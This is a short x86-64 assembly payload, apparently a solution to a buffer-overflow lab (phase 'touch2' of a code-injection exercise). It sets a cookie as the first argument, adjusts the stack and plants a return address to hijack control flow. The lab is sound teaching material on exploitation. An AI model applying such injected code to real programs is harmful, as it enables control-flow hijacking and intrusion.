mov	$0x59b997fa, %rdi	# set cookie as first argument
sub     $0x658, %rsp		# move stackpointer to leave stack space for touch2
mov	$0x004017ec, 0x0(%rsp)	# set return address as first instruction of touch2
ret
